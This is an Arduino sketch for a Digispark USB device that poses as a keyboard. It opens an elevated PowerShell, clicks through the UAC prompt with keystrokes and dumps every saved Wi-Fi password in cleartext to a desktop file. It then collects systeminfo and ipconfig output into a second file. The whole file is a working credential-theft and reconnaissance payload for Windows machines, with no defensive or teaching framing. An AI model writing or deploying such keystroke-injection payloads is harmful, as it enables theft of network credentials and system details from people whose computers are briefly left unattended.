#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Open Run Dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win+R
  DigiKeyboard.delay(800);

  // Type powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);

  // Run as admin: Ctrl + Shift + Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(4000); // Wait for UAC

  // Send 'Y' for UAC approval
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(2500);

  // ====== WiFi Password Dump ======
  DigiKeyboard.print("cd $env:USERPROFILE\\Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("(netsh wlan show profiles) -match 'All User Profile' | % { $name = ($_ -split ':')[1].Trim(); netsh wlan show profile name=\"$name\" key=clear } | Out-File \"$env:USERPROFILE\\Desktop\\wifi-passwords.txt\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // ====== System Information Dump ======
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win+R
  DigiKeyboard.delay(800);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Normal CMD
  DigiKeyboard.delay(1500);

  DigiKeyboard.print("systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt && ipconfig /all >> %USERPROFILE%\\Desktop\\sysinfo.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){}
}
